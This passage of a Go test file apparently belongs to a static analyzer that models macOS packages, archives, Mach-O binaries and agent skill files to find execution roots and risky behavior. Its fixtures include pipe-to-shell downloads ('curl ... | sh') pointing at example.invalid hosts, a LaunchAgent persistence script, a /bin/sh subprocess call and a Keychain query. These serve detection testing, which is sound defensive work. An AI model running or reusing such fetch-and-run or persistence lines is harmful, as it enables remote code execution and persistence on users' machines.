	var artifacts artifact.Graph
	rootID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "sample.dmg",
		Kind:          "dmg",
		MediaType:     "application/x-apple-diskimage",
		AnalyzeStatus: "analyzed",
	})
	volumeID := artifacts.AddNode(artifact.Node{
		ParentID:      rootID,
		LogicalPath:   "sample.dmg!Sample",
		Kind:          "dmg-volume",
		MediaType:     "inode/directory",
		AnalyzeStatus: "analyzed",
	})
	firstID := artifacts.AddNode(artifact.Node{
		ParentID:      volumeID,
		LogicalPath:   "sample.dmg!Sample/One",
		Kind:          "macho",
		MediaType:     "application/x-mach-binary",
		AnalyzeStatus: "analyzed",
	})
	secondID := artifacts.AddNode(artifact.Node{
		ParentID:      volumeID,
		LogicalPath:   "sample.dmg!Sample/Two",
		Kind:          "macho",
		MediaType:     "application/x-mach-binary",
		AnalyzeStatus: "analyzed",
	})
	artifacts.AddEdge(rootID, volumeID, "contains")
	artifacts.AddEdge(volumeID, firstID, "contains")
	artifacts.AddEdge(volumeID, secondID, "contains")

	graph := Run(Context{Artifacts: &artifacts})
	if len(graph.ExecutionRoots) != 0 {
		t.Fatalf("DMG members should not become execution roots: %#v", graph.ExecutionRoots)
	}
}

func TestRunDoesNotPromotePlainArchiveMembersToExecutionRoots(t *testing.T) {
	var artifacts artifact.Graph
	rootID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "sample.zip",
		Kind:          "zip",
		MediaType:     "application/zip",
		AnalyzeStatus: "analyzed",
	})
	firstID := artifacts.AddNode(artifact.Node{
		ParentID:      rootID,
		LogicalPath:   "sample.zip!one.sh",
		Kind:          "script",
		MediaType:     "text/plain",
		AnalyzeStatus: "analyzed",
	})
	secondID := artifacts.AddNode(artifact.Node{
		ParentID:      rootID,
		LogicalPath:   "sample.zip!Payload/two.py",
		Kind:          "script",
		MediaType:     "text/plain",
		AnalyzeStatus: "analyzed",
	})
	docID := artifacts.AddNode(artifact.Node{
		ParentID:      rootID,
		LogicalPath:   "sample.zip!README.md",
		Kind:          "text",
		MediaType:     "text/markdown",
		SourceRole:    "documentation",
		AnalyzeStatus: "analyzed",
	})
	artifacts.AddEdge(rootID, firstID, "contains")
	artifacts.AddEdge(rootID, secondID, "contains")
	artifacts.AddEdge(rootID, docID, "contains")

	graph := Run(Context{Artifacts: &artifacts})
	if len(graph.ExecutionRoots) != 0 {
		t.Fatalf("archive membership created execution roots: %#v", graph.ExecutionRoots)
	}
}

func TestRunAnalyzesTopLevelDirectoryCandidateWithoutPromotingRoot(t *testing.T) {
	var artifacts artifact.Graph
	rootID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "sample",
		Kind:          "directory",
		MediaType:     "inode/directory",
		AnalyzeStatus: "analyzed",
	})
	nodeID := artifacts.AddNode(artifact.Node{
		ParentID:      rootID,
		LogicalPath:   "sample/launchAgentInstaller",
		Kind:          "text",
		MediaType:     "text/plain",
		AnalyzeStatus: "analyzed",
	})
	artifacts.AddEdge(rootID, nodeID, "contains")

	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:      nodeID,
			LogicalPath: "sample/launchAgentInstaller",
			Kind:        "text",
			MediaType:   "text/plain",
			Data: []byte(`DOMAIN="example.invalid"
cat << EOL > ~/Library/LaunchAgents/$DOMAIN.plist
payload
EOL
launchctl load ~/Library/LaunchAgents/$DOMAIN.plist
`),
		}},
	})

	if len(graph.ExecutionRoots) != 0 {
		t.Fatalf("directory membership created an execution root: %#v", graph.ExecutionRoots)
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("extensionless candidate without a selected host produced operations: %#v", graph.Operations)
	}
	if !hasCoverageArea(graph, nodeID, "text-semantics", "skipped") {
		t.Fatalf("unresolved candidate host lacks explicit coverage: %#v", graph.Coverage)
	}
}

func TestPromoteNodeExecutionDoesNotPromoteUnknownFunctionScopedOperations(t *testing.T) {
	graph := behavior.Graph{Operations: []behavior.ModeledOperation{
		{SubjectNodeID: "node-0001", Kind: "credential.store.read", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleSource, behavior.Resource{Kind: behavior.ResourceCredentialStore, Value: "", Classifications: []behavior.ResourceClassification{behavior.ResourceClassKeychain}})), Execution: unknownExecutionContext()},
		{SubjectNodeID: "node-0001", Kind: "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: ""})), SourceFunction: "helper", Execution: unknownExecutionContext()},
	}}

	promoteNodeExecution(&graph, map[string]behavior.ExecutionContext{"node-0001": connectedExecutionContext([]string{"root-0001"}, nil)})

	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityConnected || !containsString(graph.Operations[0].Execution.ExecutionRootIDs, "root-0001") {
		t.Fatalf("plain root operation was not promoted: %#v", graph.Operations[0])
	}
	if graph.Operations[1].Execution.Connectivity != behavior.ConnectivityUnknown || len(graph.Operations[1].Execution.ExecutionRootIDs) != 0 {
		t.Fatalf("function-scoped operation should keep unknown connectivity: %#v", graph.Operations[1])
	}
}

func TestRunDoesNotTreatPlainTextAPINamesAsNativeBehavior(t *testing.T) {
	var artifacts artifact.Graph
	nodeID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "README.txt",
		Kind:          "text",
		MediaType:     "text/plain",
		AnalyzeStatus: "analyzed",
	})
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:      nodeID,
			LogicalPath: "README.txt",
			Kind:        "text",
			MediaType:   "text/plain",
			Data:        []byte("The SecItemCopyMatching API is documented here.\n"),
		}},
	})
	for _, operation := range graph.Operations {
		if operation.Kind == "credential.store.read" {
			t.Fatalf("plain documentation text should not become native API behavior: %#v", graph.Operations)
		}
	}
}

func TestRunSkipsBehaviorExtroperationForNonRuntimeSourceRoles(t *testing.T) {
	for _, role := range []string{"documentation", "test", "fixture", "vendor", "generated/build", "packaged-content"} {
		t.Run(role, func(t *testing.T) {
			var artifacts artifact.Graph
			rootID := artifacts.AddNode(artifact.Node{
				LogicalPath:   "sample.zip",
				Kind:          "zip",
				MediaType:     "application/zip",
				SourceRole:    "target",
				AnalyzeStatus: "analyzed",
			})
			nodeID := artifacts.AddNode(artifact.Node{
				ParentID:      rootID,
				LogicalPath:   "sample.zip!" + role + "/nested/tool.py",
				Kind:          "script",
				MediaType:     "text/plain",
				SourceRole:    role,
				AnalyzeStatus: "analyzed",
			})
			artifacts.AddEdge(rootID, nodeID, "contains")
			graph := Run(Context{
				Artifacts: &artifacts,
				Contents: []artifact.Content{{
					NodeID:      nodeID,
					LogicalPath: "sample.zip!" + role + "/nested/tool.py",
					Kind:        "text",
					MediaType:   "text/plain",
					Role:        role,
					Data:        []byte("import subprocess\nsubprocess.run(['/bin/sh', '-c', 'id'])\n"),
				}},
			})
			if len(graph.Operations) != 0 || len(graph.Features) != 0 || len(graph.Network) != 0 || len(graph.ArtifactProperties) != 0 {
				t.Fatalf("%s content produced behavior: %#v", role, graph)
			}
			analysisArea := "behavior-source-role/" + strings.ReplaceAll(role, "/", "-")
			covered := false
			for _, item := range graph.Coverage {
				if item.AnalysisArea == analysisArea && item.Status == "skipped" {
					covered = true
					break
				}
			}
			if !covered {
				t.Fatalf("%s omission lacks structured coverage: %#v", role, graph.Coverage)
			}
		})
	}
}

func TestRunAnalyzesAgentSkillAsInstructionsWithoutExecutionClaims(t *testing.T) {
	var artifacts artifact.Graph
	archiveID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "skills.zip",
		Kind:          "zip",
		MediaType:     "application/zip",
		SourceRole:    "target",
		AnalyzeStatus: "analyzed",
	})
	skillID := artifacts.AddNode(artifact.Node{
		ParentID:      archiveID,
		LogicalPath:   "skills.zip!demo-skill/SKILL.md",
		Kind:          "agent-skill",
		MediaType:     "text/markdown",
		SourceRole:    "documentation",
		AnalyzeStatus: "analyzed",
	})
	artifacts.AddEdge(archiveID, skillID, "contains")

	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:      skillID,
			LogicalPath: "skills.zip!demo-skill/SKILL.md",
			Kind:        "agent-skill",
			MediaType:   "text/markdown",
			Role:        "documentation",
			Data: []byte(`---
name: demo-skill
description: Demonstrates a bounded skill record
allowed-tools: Bash Read
---
See [the reference](https://example.invalid/reference).

` + "```sh\ncurl https://example.invalid/payload | sh\n```\n"),
		}},
	})

	for _, expected := range [][2]string{
		{"agent.skill.name", "demo-skill"},
		{"agent.skill.description", "Demonstrates a bounded skill record"},
		{"agent.skill.allowed_tool", "Bash"},
		{"agent.skill.allowed_tool", "Read"},
		{"agent.skill.external_link", "https://example.invalid/reference"},
	} {
		if !hasFeatureValue(graph, expected[0], expected[1]) {
			t.Errorf("missing agent-skill feature %s=%q: %#v", expected[0], expected[1], graph.Features)
		}
	}
	if !hasFeatureValue(graph, "agent.skill.shell_code_block", "curl https://example.invalid/payload | sh") {
		t.Errorf("missing bounded shell-code-block observation: %#v", graph.Features)
	}
	if len(graph.ArtifactProperties) != 1 ||
		graph.ArtifactProperties[0].NodeID != skillID ||
		graph.ArtifactProperties[0].Kind != "agent-skill-format" ||
		graph.ArtifactProperties[0].Value != "agentskills.io/SKILL.md" ||
		graph.ArtifactProperties[0].Support != behavior.SupportDirect {
		t.Fatalf("agent-skill format property = %#v", graph.ArtifactProperties)
	}
	if !hasCoverageArea(graph, skillID, "agent-instruction-semantics", "partial") {
		t.Fatalf("agent-skill instruction boundary lacks partial coverage: %#v", graph.Coverage)
	}
	for _, coverage := range graph.Coverage {
		if strings.HasPrefix(coverage.AnalysisArea, "behavior-source-role/") {
			t.Fatalf("forced agent-skill analysis retained contradictory source-role skip: %#v", graph.Coverage)
		}
	}
	if len(graph.AnalysisSelections) != 1 ||
		graph.AnalysisSelections[0].NodeID != skillID ||
		!slices.Contains(graph.AnalysisSelections[0].Reasons, behavior.SelectionReasonDefaultRelevant) {
		t.Fatalf("agent-skill analysis selection = %#v", graph.AnalysisSelections)
	}
	if len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 0 || len(graph.Operations) != 0 || len(graph.Network) != 0 || len(graph.Relations) != 0 {
		t.Fatalf("agent instructions became execution behavior: roots=%#v targets=%#v operations=%#v network=%#v relations=%#v", graph.ExecutionRoots, graph.InvokedTargets, graph.Operations, graph.Network, graph.Relations)
	}
}

func TestRunRequiresExplicitInclusionForUnreferencedCArchiveContent(t *testing.T) {
	const (
		textURL   = "https://packaged-text.example.invalid/payload"
		nativeURL = "https://packaged-native.example.invalid/payload"
	)
	var artifacts artifact.Graph
	carrierID := artifacts.AddNode(artifact.Node{LogicalPath: "carrier.bin", Kind: "blob", SourceRole: "target", AnalyzeStatus: "analyzed"})
	archiveID := artifacts.AddNode(artifact.Node{ParentID: carrierID, LogicalPath: "carrier.bin!carchive", Kind: "carchive", SourceRole: "unknown", AnalyzeStatus: "analyzed"})
	textID := artifacts.AddNode(artifact.Node{ParentID: archiveID, LogicalPath: "carrier.bin!carchive!payload.sh", Kind: "script", MediaType: "text/plain", SourceRole: "packaged-content", AnalyzeStatus: "analyzed"})
	nativeID := artifacts.AddNode(artifact.Node{ParentID: archiveID, LogicalPath: "carrier.bin!carchive!helper", Kind: "macho", MediaType: "application/x-mach-binary", SourceRole: "packaged-content", AnalyzeStatus: "analyzed"})
	artifacts.AddEdge(carrierID, archiveID, "contains")
	artifacts.AddEdge(archiveID, textID, "contains")
	artifacts.AddEdge(archiveID, nativeID, "contains")
	contents := []artifact.Content{
		{NodeID: textID, LogicalPath: "carrier.bin!carchive!payload.sh", Kind: "script", MediaType: "text/plain", Role: "packaged-content", Data: []byte("curl " + textURL + " | sh\n")},
		{NodeID: nativeID, LogicalPath: "carrier.bin!carchive!helper", Kind: "macho", MediaType: "application/x-mach-binary", Role: "packaged-content", Data: testPackagedMachOWithURL(nativeURL)},
	}

	shallow := Run(Context{Artifacts: &artifacts, Contents: contents})
	if len(shallow.Operations) != 0 || len(shallow.Features) != 0 || len(shallow.Network) != 0 {
		t.Fatalf("default packaged-content policy emitted semantic findings: operations=%#v features=%#v network=%#v", shallow.Operations, shallow.Features, shallow.Network)
	}
	covered := false
	for _, item := range shallow.Coverage {
		if item.AnalysisArea == "behavior-source-role/packaged-content" && item.Status == "skipped" && strings.Contains(item.Detail, "2 retained") && strings.Contains(item.Detail, "--include-unreferenced") {
			covered = true
		}
	}
	if !covered {
		t.Fatalf("packaged-content omission lacks explicit source-role coverage: %#v", shallow.Coverage)
	}

	deep := Run(Context{Artifacts: &artifacts, Contents: contents, Options: artifact.Options{IncludeUnreferenced: true}})
	textOperation, nativeFeature := false, false
	for _, operation := range deep.Operations {
		textOperation = textOperation || operation.SubjectNodeID == textID && operation.RequiredResource().Value == textURL
	}
	for _, feature := range deep.Features {
		nativeFeature = nativeFeature || feature.NodeID == nativeID && feature.Key == "network.url" && feature.Value == nativeURL
	}
	if !textOperation || !nativeFeature {
		t.Fatalf("--include-unreferenced did not restore packaged text/native analysis: text-operation=%v native-feature=%v graph=%#v", textOperation, nativeFeature, deep)
	}
}

func TestCArchiveDescendantAppAndPackageDeclarationsCannotMintRoots(t *testing.T) {
	const (
		appURL = "https://nested-app.example.invalid/payload"
		pkgURL = "https://nested-pkg.example.invalid/payload"
	)
	var artifacts artifact.Graph
	carrierID := artifacts.AddNode(artifact.Node{LogicalPath: "carrier", Kind: "macho", SourceRole: "target", AnalyzeStatus: "analyzed"})
	archiveID := artifacts.AddNode(artifact.Node{ParentID: carrierID, LogicalPath: "carrier!carchive", Kind: "carchive", AnalyzeStatus: "analyzed"})
	containerID := artifacts.AddNode(artifact.Node{ParentID: archiveID, LogicalPath: "carrier!carchive!payload.zip", Kind: "zip", SourceRole: "packaged-content", AnalyzeStatus: "analyzed"})
	appID := artifacts.AddNode(artifact.Node{ParentID: containerID, LogicalPath: "carrier!carchive!payload.zip!Payload/Fake.app", Kind: "app-bundle", SourceRole: "packaged-content", AnalyzeStatus: "analyzed"})
	appExecutableID := artifacts.AddNode(artifact.Node{ParentID: appID, LogicalPath: "carrier!carchive!payload.zip!Payload/Fake.app/Contents/MacOS/Fake", Kind: "script", MediaType: "text/plain", SourceRole: "packaged-content", AnalyzeStatus: "analyzed"})
	pkgScriptID := artifacts.AddNode(artifact.Node{ParentID: containerID, LogicalPath: "carrier!carchive!payload.zip!nested.pkg!Scripts!postinstall", Kind: "script", MediaType: "text/plain", SourceRole: "packaged-content", AnalyzeStatus: "analyzed"})
	artifacts.AddEdge(carrierID, archiveID, "contains")
	artifacts.AddEdge(archiveID, containerID, "contains")
	artifacts.AddEdge(containerID, appID, "contains")
	artifacts.AddEdge(appID, appExecutableID, "contains")
	artifacts.AddEdge(appID, appExecutableID, "bundle-executable")
	artifacts.AddEdge(containerID, pkgScriptID, "contains")
	contents := []artifact.Content{
		{NodeID: appExecutableID, LogicalPath: "carrier!carchive!payload.zip!Payload/Fake.app/Contents/MacOS/Fake", Kind: "script", MediaType: "text/plain", Role: "packaged-content", Data: []byte("#!/bin/sh\ncurl " + appURL + "\n")},
		{NodeID: pkgScriptID, LogicalPath: "carrier!carchive!payload.zip!nested.pkg!Scripts!postinstall", Kind: "script", MediaType: "text/plain", Role: "packaged-content", Data: []byte("#!/bin/sh\ncurl " + pkgURL + "\n")},
	}

	shallow := Run(Context{Artifacts: &artifacts, Contents: contents})
	if len(shallow.ExecutionRoots) != 1 || shallow.ExecutionRoots[0].StartNodeID != carrierID {
		t.Fatalf("nested declarations changed shallow execution roots: %#v", shallow.ExecutionRoots)
	}
	if len(shallow.Operations) != 0 {
		t.Fatalf("default packaged-content policy analyzed nested declarations: %#v", shallow.Operations)
	}

	deep := Run(Context{Artifacts: &artifacts, Contents: contents, Options: artifact.Options{IncludeUnreferenced: true}})
	if len(deep.ExecutionRoots) != 1 || deep.ExecutionRoots[0].StartNodeID != carrierID {
		t.Fatalf("--include-unreferenced changed root eligibility for nested declarations: %#v", deep.ExecutionRoots)
	}
	found := map[string]bool{}
	for _, operation := range deep.Operations {
		if operation.RequiredResource().Value != appURL && operation.RequiredResource().Value != pkgURL {
			continue
		}
		found[operation.RequiredResource().Value] = true
		if operation.Execution.Connectivity != behavior.ConnectivityUnknown || len(operation.Execution.ExecutionRootIDs) != 0 || len(operation.Execution.InvokedTargetIDs) != 0 {
			t.Fatalf("uninvoked deep content gained execution context: %#v", operation)
		}
	}
	if !found[appURL] || !found[pkgURL] {
		t.Fatalf("--deep did not retain bounded analysis without roots: found=%#v operations=%#v", found, deep.Operations)
	}
}

func TestCArchiveIneligibleMemberRemainsReachableWhenCarrierInvokesIt(t *testing.T) {
	const targetURL = "https://invoked-member.example.invalid/payload"
	var artifacts artifact.Graph
	carrierID := artifacts.AddNode(artifact.Node{LogicalPath: "carrier", Kind: "macho", SourceRole: "target", AnalyzeStatus: "analyzed"})
	archiveID := artifacts.AddNode(artifact.Node{ParentID: carrierID, LogicalPath: "carrier!carchive", Kind: "carchive", AnalyzeStatus: "analyzed"})
	targetID := artifacts.AddNode(artifact.Node{ParentID: archiveID, LogicalPath: "carrier!carchive!payload.sh", Kind: "script", MediaType: "text/plain", SourceRole: "packaged-content", AnalyzeStatus: "analyzed"})
	artifacts.AddEdge(carrierID, archiveID, "contains")
	artifacts.AddEdge(archiveID, targetID, "contains")
	artifacts.AddOrderedEdge(carrierID, targetID, "loader-invokes", 0)

	graph := Run(Context{Artifacts: &artifacts, Contents: []artifact.Content{{
		NodeID: targetID, LogicalPath: "carrier!carchive!payload.sh", Kind: "script", MediaType: "text/plain", Role: "packaged-content", Data: []byte("curl " + targetURL + "\n"),
	}}})
	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].StartNodeID != carrierID {
		t.Fatalf("invoked member became a root instead of a target: %#v", graph.ExecutionRoots)
	}
	targetExecution := invokedTargetExecutionByNode(graph.InvokedTargets)[targetID]
	for _, operation := range graph.Operations {
		if operation.RequiredResource().Value != targetURL {
			continue
		}
		if operation.Execution.Connectivity != behavior.ConnectivityConnected || !containsString(operation.Execution.ExecutionRootIDs, graph.ExecutionRoots[0].ID) || len(targetExecution.InvokedTargetIDs) == 0 || !containsString(operation.Execution.InvokedTargetIDs, targetExecution.InvokedTargetIDs[0]) {
			t.Fatalf("invoked member lost carrier context: %#v", operation)
		}
		return
	}
	t.Fatalf("explicitly invoked packaged member was not analyzed: %#v", graph.Operations)
}

func TestConnectedTargetContextAttachesOnlyToLocallyConnectedFunctions(t *testing.T) {
	local := connectedExecutionContext([]string{"root-carrier"}, nil)
	inherited := connectedExecutionContext([]string{"root-carrier"}, []string{"target-script"})
	graph := behavior.Graph{Operations: []behavior.ModeledOperation{
		{SubjectNodeID: "node-target", SourceFunction: "main", Execution: local},
		{SubjectNodeID: "node-target", SourceFunction: "unreferenced", Execution: unknownExecutionContext()},
	}}
	promoteNodeExecution(&graph, map[string]behavior.ExecutionContext{"node-target": inherited})
	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityConnected || !containsString(graph.Operations[0].Execution.ExecutionRootIDs, "root-carrier") || !containsString(graph.Operations[0].Execution.InvokedTargetIDs, "target-script") {
		t.Fatalf("locally connected function lost invoking-root context: %#v", graph.Operations[0])
	}
	if graph.Operations[1].Execution.Connectivity != behavior.ConnectivityUnknown || len(graph.Operations[1].Execution.ExecutionRootIDs) != 0 || len(graph.Operations[1].Execution.InvokedTargetIDs) != 0 {
		t.Fatalf("unconnected function was promoted by node-level invocation alone: %#v", graph.Operations[1])
	}
}

func testPackagedMachOWithURL(value string) []byte {
	const header64Size = 32
	data := make([]byte, header64Size, header64Size+len(value)+2)
	binary.LittleEndian.PutUint32(data[0:4], macho.Magic64)
	binary.LittleEndian.PutUint32(data[4:8], uint32(macho.CpuArm64))
	binary.LittleEndian.PutUint32(data[12:16], uint32(macho.TypeExec))
	data = append(data, 0)
	data = append(data, value...)
	return append(data, 0)
}

func TestPrioritizeBehaviorContentsPutsExecutionRootsBeforeBulkNativeAnalysis(t *testing.T) {
	contents := []artifact.Content{
		{NodeID: "native", LogicalPath: "bulk", Kind: "macho", Role: "runtime"},
		{NodeID: "text", LogicalPath: "notes", Kind: "text", Role: "unknown"},
		{NodeID: "hook", LogicalPath: "Scripts!postinstall", Kind: "script", Role: "runtime"},
	}
	got := prioritizeBehaviorContents(contents, map[string][]string{"hook": {"root-1"}}, map[string]bool{"hook": true}, nil, nil, nodePackageEntryPlanSet{})
	if len(got) != 3 || got[0].NodeID != "hook" || got[2].NodeID != "native" {
		t.Fatalf("behavior priority = %#v", got)
	}
}

func TestRunTreatsNativeSourceAPINamesAsUnresolvedBehavior(t *testing.T) {
	var artifacts artifact.Graph
	nodeID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "Keychain.swift",
		Kind:          "text",
		MediaType:     "text/plain",
		AnalyzeStatus: "analyzed",
	})
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:      nodeID,
			LogicalPath: "Keychain.swift",
			Kind:        "text",
			MediaType:   "text/plain",
			Data:        []byte("SecItemCopyMatching(query as CFDictionary, nil)\n"),
		}},
	})
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationKeychainItemQuery && operation.RequiredResource().HasClassification(behavior.ResourceClassKeychain) {
			return
		}
	}
	t.Fatalf("native source API reference should produce a behavior operation: %#v", graph.Operations)
}

func TestRunDoesNotGenericScanPackageJSONMetadata(t *testing.T) {
	var artifacts artifact.Graph
	nodeID := artifacts.AddNode(artifact.Node{
		LogicalPath:   "package.json",
		Kind:          "manifest",
		MediaType:     "text/plain",
		AnalyzeStatus: "analyzed",
	})
	graph := Run(Context{
		Artifacts: &artifacts,
		Contents: []artifact.Content{{
			NodeID:      nodeID,
			LogicalPath: "package.json",
			Kind:        "manifest",
			MediaType:   "text/plain",
			Data: []byte(`{
  "name": "fixture",
  "description": "Documentation mentions curl https://docs.example/install.sh | sh",
  "contributes": {"commands": [{"command": "fixture.open", "title": "Open Logs"}]}
}`),
		}},
	})
	for _, evidence := range graph.Evidence {
		if evidence.Kind == "text-line" {
			t.Fatalf("package metadata should not be generic text-scanned: %#v", graph.Evidence)
		}
	}
	for _, operation := range graph.Operations {
		if operation.Kind == "network.download" || operation.Kind == "interpreter.invoke" {
			t.Fatalf("package metadata prose should not become behavior: %#v", graph.Operations)
		}
	}
}

func reportableTestOperations(operations []behavior.ModeledOperation) []behavior.ModeledOperation {
	var out []behavior.ModeledOperation
	for _, operation := range operations {
		switch operation.Kind {
		case "network.download", "file.make-executable", "process.execute":
			out = append(out, operation)
		}
	}
	return out
}
